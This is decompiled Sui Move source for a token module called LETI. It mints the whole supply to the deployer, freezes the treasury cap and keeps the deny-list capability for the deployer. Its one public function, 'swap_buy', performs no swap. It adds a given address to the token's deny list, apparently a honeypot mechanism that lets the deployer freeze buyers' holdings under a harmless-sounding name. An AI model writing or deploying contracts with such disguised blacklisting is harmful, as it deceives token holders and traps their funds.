module 0x95d34a3c2cdbf28035209c5499ea6b4ba3b3352b8c926b7cf51bdd3242bda8ea::leti {
    struct LETI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LETI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LETI>(arg0, 9, b"LETI", b"Leti", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSkuuUtAocLKerTKyiY5xdDgfJeB7tdn8JbqmPAvta9ZW"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LETI>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LETI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LETI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LETI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LETI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LETI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

